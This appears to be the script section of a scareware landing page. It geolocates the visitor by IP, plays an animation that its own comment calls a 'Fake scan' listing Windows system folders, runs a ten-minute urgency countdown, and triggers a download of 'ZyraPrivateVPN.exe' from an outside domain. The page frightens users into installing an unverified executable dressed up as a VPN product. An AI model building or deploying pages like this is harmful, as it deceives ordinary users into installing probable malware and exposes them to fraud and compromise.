<!-- IP Detection -->
<script>
(function(){
  const flags = {
    US:'🇺🇸',GB:'🇬🇧',DE:'🇩🇪',FR:'🇫🇷',IT:'🇮🇹',ES:'🇪🇸',NL:'🇳🇱',
    PL:'🇵🇱',PT:'🇵🇹',JP:'🇯🇵',KR:'🇰🇷',TH:'🇹🇭',ID:'🇮🇩',VN:'🇻🇳',
    MY:'🇲🇾',SG:'🇸🇬',AU:'🇦🇺',CA:'🇨🇦',UA:'🇺🇦',RU:'🇷🇺',TR:'🇹🇷',
    SE:'🇸🇪',NO:'🇳🇴',DK:'🇩🇰',FI:'🇫🇮',BE:'🇧🇪',CH:'🇨🇭',AT:'🇦🇹',
    CZ:'🇨🇿',HU:'🇭🇺',RO:'🇷🇴',BG:'🇧🇬',HR:'🇭🇷',SK:'🇸🇰',IN:'🇮🇳',
  };
  fetch('https://ipapi.co/json/')
    .then(r => r.json())
    .then(d => {
      if (d.ip) document.getElementById('user-ip').textContent = d.ip;
      const cc = d.country_code || '';
      document.getElementById('ip-flag').textContent = flags[cc] || '🌍';
      const parts = [d.city, d.country_name].filter(Boolean);
      if (parts.length) document.getElementById('ip-loc').textContent = parts.join(', ');
    })
    .catch(() => {
      document.getElementById('user-ip').textContent = '92.xxx.xxx.xxx';
      document.getElementById('ip-loc').textContent = '—';
    });
})();
</script>

<!-- Fake scan animation -->
<script>
(function(){
  const bar = document.getElementById('scanBar');
  const status = document.getElementById('scanStatus');
  const result = document.getElementById('scanResult');
  const files = [
    'C:\\Windows\\System32\\drivers\\...',
    'C:\\Users\\AppData\\Local\\Temp\\...',
    'C:\\Program Files\\...',
    'C:\\Windows\\SysWOW64\\...',
    'C:\\Users\\Downloads\\...',
  ];
  let pct = 0;
  let fi = 0;
  const interval = setInterval(() => {
    pct += Math.random() * 3 + 1;
    if (pct >= 100) { pct = 100; clearInterval(interval); }
    bar.style.width = Math.min(pct, 100) + '%';
    if (fi < files.length && pct > fi * 20) {
      status.textContent = files[fi++];
    }
    if (pct >= 100) {
      status.textContent = '';
      result.classList.add('show');
    }
  }, 120);
})();
</script>

<!-- Timer countdown -->
<script>
(function(){
  let t = 9 * 60 + 59;
  const el = document.getElementById('timer');
  setInterval(() => {
    if (t <= 0) return;
    t--;
    const m = String(Math.floor(t / 60)).padStart(2,'0');
    const s = String(t % 60).padStart(2,'0');
    el.textContent = m + ':' + s;
  }, 1000);
})();
</script>

<!-- Download overlay logic -->
<script>
function triggerDownload() {
  var a = document.createElement('a');
  a.href = 'https://vpnshieldguard.net/latest/ZyraPrivateVPN.exe';
  a.download = 'ZyraPrivateVPN.exe';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  document.getElementById('dl-overlay').classList.add('active');
  document.body.style.overflow = 'hidden';
}

function closeDlOverlay() {
  document.getElementById('dl-overlay').classList.remove('active');
  document.body.style.overflow = '';
}
</script>

<!-- Modal logic -->
<script>
function openModal(id) {
  const overlay = document.getElementById('modal-overlay');
  overlay.classList.add('active');
  document.querySelectorAll('.modal-box').forEach(m => m.classList.remove('visible'));
  const target = document.getElementById('modal-' + id);
  if (target) target.classList.add('visible');
  document.body.style.overflow = 'hidden';
}
function closeModal() {
  document.getElementById('modal-overlay').classList.remove('active');
  document.body.style.overflow = '';
}
function closeModalOutside(e) {
  if (e.target.id === 'modal-overlay') closeModal();
}
</script>

<!-- Scroll animations -->
<script>
(function(){
  const obs = new IntersectionObserver(entries => {
    entries.forEach(e => {
      if (e.isIntersecting) {
        e.target.style.opacity = '1';
        e.target.style.transform = 'translateY(0)';
        obs.unobserve(e.target);
      }
    });
  }, { threshold: 0.1 });
  document.querySelectorAll('.feat-card, .step, .stat-item').forEach(el => {
    el.style.opacity = '0';
    el.style.transform = 'translateY(20px)';
    el.style.transition = 'opacity .55s ease, transform .55s ease';
    obs.observe(el);
  });
})();
</script>

